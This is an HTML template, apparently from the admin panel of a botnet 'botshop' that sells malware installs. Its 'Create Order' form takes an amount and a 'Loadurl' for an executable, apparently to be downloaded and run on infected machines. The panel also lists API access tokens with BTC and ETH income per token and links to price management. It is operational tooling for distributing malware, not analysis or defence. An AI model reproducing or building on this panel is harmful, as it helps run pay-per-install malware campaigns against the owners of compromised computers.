<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <form method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Create Order</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                Amount   <br>
                <input class="form-control"  name="amount" value="" placeholder="200" required>
                <br>
                Loadurl   <br>
                <input class="form-control" name="loadurl" value="" placeholder="Load url http://example.com/putty.exe" required>
                <br>
                Frontend Access Token   <br>
                <input class="form-control" name="frontend_user" value="{$frontend_user}" placeholder="Load url http://example.com/putty.exe" required>   <br>
                Botshop Backend API Token    <br>
                <select class="form-control" name="use_api" required>
                    {foreach item=api from=$access_apis}
                        <option value="{$api.id}">{$api.apikey}</option>
                    {/foreach}
                </select>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="submit" class="btn btn-primary">Create order</button>
            </div>
            </form>
        </div>
    </div>
</div>



  <div class="form-inline">

        <div class="form-group">
            <form method="POST">
                <input type="submit" name="create_new_shop_api" class="btn btn-dark" value="Create new API Access token">
            </form>
        </div>

        <div class="form-group">
            <form method="POST">
               <a class="btn btn-dark" href="/botshopprice">Price Management</a>
            </form>
        </div>

      <button type="button" class="btn btn-dark" data-toggle="modal" data-target="#exampleModal">
         Create Frontend Order
      </button>
    </div>
    <div class="shop_api_access">
        <ul class="list-group">
            {foreach from=$botshopAccessList item=botshopApi}
                <li class="list-group-item">
                    <div class="row">
                        <div class="col-md-2">
                            <div class="username"> Created By: {$botshopApi.username}  </div>
                            <div class="profit"> BTC Income: {$botshopApi.profit_btc}  </div>
                            <div class="profit"> ETH Income: {$botshopApi.profit_eth}  </div>
                        </div>
                        <div class="col-md-6">
                            <div class="apikey">
                                Access Token: {$botshopApi.apikey}
                            </div>
                        </div>
                        <div class="col-md-4">
                            <form method="post" id="delete-{$botshopApi.id}">
                                <img width="25"  onclick="document.getElementById('delete-{$botshopApi.id}').submit()" src="{$includeDir}assets/img/delete_dark.svg" title="Delete">
                                <input name="deleteapi" value="{$botshopApi.id}" hidden>
                                <input name="apikey" value="{$botshopApi.apikey}" hidden>
                                <a href="/editapi/{$botshopApi.id}">API Settings</a>
                            </form>

                        </div>

                    </div>
                </li>
            {/foreach}
        </ul>
    </div>

